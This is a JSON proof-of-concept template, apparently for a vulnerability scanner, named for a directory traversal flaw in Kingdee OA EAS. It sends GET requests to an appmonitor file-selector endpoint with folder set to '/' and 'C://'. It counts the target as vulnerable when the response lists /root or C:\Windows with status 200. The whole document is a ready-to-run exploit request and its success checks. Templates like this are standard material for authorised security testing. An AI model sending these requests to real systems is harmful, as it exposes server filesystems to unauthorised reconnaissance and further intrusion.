{
    "Name": "金蝶OA-eas-directory-traversal-linux",
    "Description": "金蝶OA-eas-directory-traversal",
    "Product": "金蝶OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/appmonitor/protected/selector/server_file/files?folder=/&suffix=",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
            "Operation": "contains",
            "Key":"",
            "Value": "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}"
            },
            {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
             }
        ]
        },
        "Next_decide":"OR"
        },
        {
            "Method": "GET",
            "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
            "Uri":"/appmonitor/protected/selector/server_file/files?folder=C://&suffix=",
            "Port":"",
            "Data":"",
            "Follow_redirects":"false",
            "Upload":{"Name": "","fileName": "","filePath": "" },
            "Response":{
            "Check_Steps":"AND",
            "Checks": [
                {
                    "Operation": "contains",
                    "Key":"",
                    "Value": "{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}"
                },
                {
                    "Operation": "code", 
                    "Key":"",
                    "Value": "200"  
                 }
            ]
            },
            "Next_decide":""}
            
    ]}